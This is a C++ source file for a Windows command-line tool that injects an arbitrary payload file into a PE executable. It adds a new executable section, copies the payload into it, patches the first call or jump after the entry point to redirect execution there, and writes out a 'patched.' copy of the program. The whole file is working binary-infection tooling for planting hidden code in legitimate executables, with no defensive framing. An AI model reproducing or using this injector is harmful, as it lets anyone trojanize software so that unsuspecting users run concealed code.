#include <iostream>
#include <regex>
#include <vector>
#include <fstream>
#include <Windows.h>

#define SectionName ".newsec"

struct PE32_HS
{
	PIMAGE_DOS_HEADER DOS_H{};
	PIMAGE_FILE_HEADER FILE_H{};
	PIMAGE_OPTIONAL_HEADER32 OPTIONAL_H{};
	PIMAGE_SECTION_HEADER SECTION_H{};
	struct PE64_HS
	{
		PIMAGE_OPTIONAL_HEADER64 OPTIONAL_H{};
	} PE64_HEADERS;

} PE32_HEADERS;

auto align = [](int value, int alignment) -> int {
	return ((value + (alignment - 1)) / alignment) * alignment;
};

BOOL PEParser(std::vector<char>& buffer)
{
	// Parses PE file structures
	PE32_HEADERS.DOS_H = reinterpret_cast<PIMAGE_DOS_HEADER>(&buffer[0]);
	// Checks the PE signature
	if (PE32_HEADERS.DOS_H->e_magic != IMAGE_DOS_SIGNATURE)
	{
		std::cout << "[!] Invalid PE file." << std::endl;
		return FALSE;
	}

	PE32_HEADERS.FILE_H = reinterpret_cast<PIMAGE_FILE_HEADER>(&buffer[0] + PE32_HEADERS.DOS_H->e_lfanew + sizeof(DWORD));
	if (PE32_HEADERS.FILE_H->Machine == 0x14C) // x32
	{
		PE32_HEADERS.OPTIONAL_H = reinterpret_cast<PIMAGE_OPTIONAL_HEADER32>(&buffer[0] + PE32_HEADERS.DOS_H->e_lfanew + sizeof(DWORD) + sizeof(IMAGE_FILE_HEADER));
		PE32_HEADERS.SECTION_H = reinterpret_cast<PIMAGE_SECTION_HEADER>(&buffer[0] + PE32_HEADERS.DOS_H->e_lfanew + sizeof(IMAGE_NT_HEADERS32));
	}
	else
	{
		PE32_HEADERS.PE64_HEADERS.OPTIONAL_H = reinterpret_cast<PIMAGE_OPTIONAL_HEADER64>(&buffer[0] + PE32_HEADERS.DOS_H->e_lfanew + sizeof(DWORD) + sizeof(IMAGE_FILE_HEADER));
		PE32_HEADERS.SECTION_H = reinterpret_cast<PIMAGE_SECTION_HEADER>(&buffer[0] + PE32_HEADERS.DOS_H->e_lfanew + sizeof(IMAGE_NT_HEADERS64));
	}

	return TRUE;
}

VOID CallStubPatcher(std::vector<char>& buffer, DWORD RawDataPointer)
{
	DWORD jmpOffset = 0;

	// Calculates the start of the code offset in the .text section
	DWORD CodeStubEntryPoint = ((PE32_HEADERS.FILE_H->Machine == 0x14C) ? PE32_HEADERS.OPTIONAL_H->AddressOfEntryPoint : PE32_HEADERS.PE64_HEADERS.OPTIONAL_H->AddressOfEntryPoint) - PE32_HEADERS.SECTION_H[0].VirtualAddress + PE32_HEADERS.SECTION_H->PointerToRawData;

	for (DWORD i = CodeStubEntryPoint; i < (PE32_HEADERS.SECTION_H[0].PointerToRelocations + PE32_HEADERS.SECTION_H[0].SizeOfRawData); i++)
	{
		// Compares opcodes
		if (((DWORD)buffer[i] & 0xff) == 0xE8 || ((DWORD)buffer[i] & 0xff) == 0xE9)
		{
			// Calculates the next address of the instruction to be executed after the jump instruction
			if (RawDataPointer <= PE32_HEADERS.SECTION_H[0].PointerToRawData + PE32_HEADERS.SECTION_H[0].SizeOfRawData)
				jmpOffset = RawDataPointer - (i + 5);
			else
				jmpOffset = (PE32_HEADERS.SECTION_H[PE32_HEADERS.FILE_H->NumberOfSections].VirtualAddress) - ((i + 5) + PE32_HEADERS.SECTION_H[0].VirtualAddress - PE32_HEADERS.SECTION_H[0].PointerToRawData);
			// Patches the operand of jump instruction
			buffer[i + 1] = (jmpOffset) & 0xFF;
			buffer[i + 2] = (jmpOffset >> 8) & 0xFF;
			buffer[i + 3] = (jmpOffset >> 16) & 0xFF;
			buffer[i + 4] = (jmpOffset >> 24) & 0xFF;
			break;
		}
	}

	return;
}

VOID AddSection(std::vector<char>& buffer, DWORD payloadSize, DWORD* RawDataPointer)
{
	// Finds the start offset of last section in file on disk
	DWORD startOfPayloadRawFile = align(
		PE32_HEADERS.SECTION_H[PE32_HEADERS.FILE_H->NumberOfSections - 1].SizeOfRawData +
		PE32_HEADERS.SECTION_H[PE32_HEADERS.FILE_H->NumberOfSections - 1].PointerToRawData,
		((PE32_HEADERS.FILE_H->Machine == 0x14C) ? PE32_HEADERS.OPTIONAL_H->FileAlignment : PE32_HEADERS.PE64_HEADERS.OPTIONAL_H->FileAlignment)
	);

	// Calculates the size of the new section
	DWORD newSectionRawSize = align(
		payloadSize,
		((PE32_HEADERS.FILE_H->Machine == 0x14C) ? PE32_HEADERS.OPTIONAL_H->FileAlignment : PE32_HEADERS.PE64_HEADERS.OPTIONAL_H->FileAlignment)
	);

	// Allocates some space between the last section and IMAGE_DIRECTORY_ENTRY_SECURITY
	buffer.insert(buffer.begin() + startOfPayloadRawFile, newSectionRawSize, NULL);

	// Sets the name of the new section
	CopyMemory(&PE32_HEADERS.SECTION_H[PE32_HEADERS.FILE_H->NumberOfSections].Name, SectionName, IMAGE_SIZEOF_SHORT_NAME);

	// Initializes the fields of the new section
	PE32_HEADERS.SECTION_H[PE32_HEADERS.FILE_H->NumberOfSections].SizeOfRawData = align(
		payloadSize,
		((PE32_HEADERS.FILE_H->Machine == 0x14C) ? PE32_HEADERS.OPTIONAL_H->FileAlignment : PE32_HEADERS.PE64_HEADERS.OPTIONAL_H->FileAlignment)
	);
	PE32_HEADERS.SECTION_H[PE32_HEADERS.FILE_H->NumberOfSections].PointerToRawData = align(
		PE32_HEADERS.SECTION_H[PE32_HEADERS.FILE_H->NumberOfSections - 1].SizeOfRawData +
		PE32_HEADERS.SECTION_H[PE32_HEADERS.FILE_H->NumberOfSections - 1].PointerToRawData,
		((PE32_HEADERS.FILE_H->Machine == 0x14C) ? PE32_HEADERS.OPTIONAL_H->FileAlignment : PE32_HEADERS.PE64_HEADERS.OPTIONAL_H->FileAlignment)
	);
	PE32_HEADERS.SECTION_H[PE32_HEADERS.FILE_H->NumberOfSections].Misc.VirtualSize = align(
		payloadSize,
		((PE32_HEADERS.FILE_H->Machine == 0x14C) ? PE32_HEADERS.OPTIONAL_H->SectionAlignment : PE32_HEADERS.PE64_HEADERS.OPTIONAL_H->SectionAlignment)
	);
	PE32_HEADERS.SECTION_H[PE32_HEADERS.FILE_H->NumberOfSections].VirtualAddress = align(
		PE32_HEADERS.SECTION_H[PE32_HEADERS.FILE_H->NumberOfSections - 1].Misc.VirtualSize +
		PE32_HEADERS.SECTION_H[PE32_HEADERS.FILE_H->NumberOfSections - 1].VirtualAddress,
		((PE32_HEADERS.FILE_H->Machine == 0x14C) ? PE32_HEADERS.OPTIONAL_H->SectionAlignment : PE32_HEADERS.PE64_HEADERS.OPTIONAL_H->SectionAlignment)
	);

	// The offset holds the position to be written with the load data
	*RawDataPointer = PE32_HEADERS.SECTION_H[PE32_HEADERS.FILE_H->NumberOfSections].PointerToRawData;

	// Section characteristics (executable/readable)
	PE32_HEADERS.SECTION_H[PE32_HEADERS.FILE_H->NumberOfSections].Characteristics = IMAGE_SCN_CNT_CODE | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_EXECUTE;

	// Patches the operand of first jump instruction (call/jmp) to payload entrypoint
	CallStubPatcher(buffer, *RawDataPointer);

	if (PE32_HEADERS.FILE_H->Machine == 0x14C) // x32
	{
		// Patches the SizeOfImage
		PE32_HEADERS.OPTIONAL_H->SizeOfImage = PE32_HEADERS.SECTION_H[PE32_HEADERS.FILE_H->NumberOfSections].VirtualAddress + PE32_HEADERS.SECTION_H[PE32_HEADERS.FILE_H->NumberOfSections].Misc.VirtualSize;
		// Patches the VA of IMAGE_DIRECTORY_ENTRY_SECURITY
		PE32_HEADERS.OPTIONAL_H->DataDirectory[IMAGE_DIRECTORY_ENTRY_SECURITY].VirtualAddress = startOfPayloadRawFile + newSectionRawSize;
	}
	else
	{
		// Patches the SizeOfImage
		PE32_HEADERS.PE64_HEADERS.OPTIONAL_H->SizeOfImage = PE32_HEADERS.SECTION_H[PE32_HEADERS.FILE_H->NumberOfSections].VirtualAddress + PE32_HEADERS.SECTION_H[PE32_HEADERS.FILE_H->NumberOfSections].Misc.VirtualSize;
		// Patches the VA of IMAGE_DIRECTORY_ENTRY_SECURITY
		PE32_HEADERS.PE64_HEADERS.OPTIONAL_H->DataDirectory[IMAGE_DIRECTORY_ENTRY_SECURITY].VirtualAddress = startOfPayloadRawFile + newSectionRawSize;
	}

	// Patches the NumberOfSections
	PE32_HEADERS.FILE_H->NumberOfSections++;

	return;
}

VOID CodeInjection(std::vector<char>& buffer, std::vector<char>& data, std::string inFileName, DWORD RawDataPointer)
{
	std::smatch outFileFullName;

	// Makes the output file path
	std::regex_search(inFileName, outFileFullName, std::regex("([^\\\\]+)$"));
	std::string outFilePath = outFileFullName.prefix().str() + "patched." + outFileFullName[1].str();

	// Injects payload into buffer
	for (size_t i = RawDataPointer; i < RawDataPointer + data.size(); i++)
		buffer[i] = data[i - RawDataPointer];

	// Opens and write to output file
	std::ofstream outputFile(outFilePath, std::ios::binary);
	outputFile.write(&buffer[0], buffer.size());
	outputFile.close();

	std::cout << "[+] Code injection done!" << std::endl;
	std::cout << "[*] Output: " << outFilePath << std::endl;

	return;
}

int main(int argc, char* const argv[])
{
	DWORD RawDataPointer = 0;

	if (argc != 3)
	{
		std::cout << "[!] Usage: code_injector.exe <PE> <Payload>" << std::endl;
		return EXIT_FAILURE;
	}

	// Opens and read PE file
	std::ifstream inFile(std::string(argv[1]), std::ios::binary);
	if (!inFile.is_open())
	{
		std::cout << "[!] Unable to open the " << argv[1] << std::endl;
		return EXIT_FAILURE;
	}
	std::vector<char> inData((std::istreambuf_iterator<char>(inFile)), std::istreambuf_iterator<char>());
	inFile.close();

	// Opens and read Payload file
	std::ifstream payloadFile(std::string(argv[2]), std::ios::binary);
	if (!payloadFile.is_open())
	{
		std::cout << "[!] Unable to open the " << argv[2] << std::endl;
		return EXIT_FAILURE;
	}
	std::vector<char> payloadData((std::istreambuf_iterator<char>(payloadFile)), std::istreambuf_iterator<char>());
	payloadFile.close();

	if (payloadData.size() == NULL)
	{
		std::cout << "[!] " << argv[2] << " is empty!" << std::endl;
		return EXIT_FAILURE;
	}

	// Parses the PE file
	if (!PEParser(inData))
		return EXIT_FAILURE;
	std::cout << "[+] PE file was parsed successfully." << std::endl;

	// Adds the new section
	AddSection(inData, (DWORD)payloadData.size(), &RawDataPointer);
	std::cout << "[+] New section was added successfully." << std::endl;

	// Injects the payload
	CodeInjection(inData, payloadData, std::string(argv[1]), RawDataPointer);

	return EXIT_SUCCESS;
}
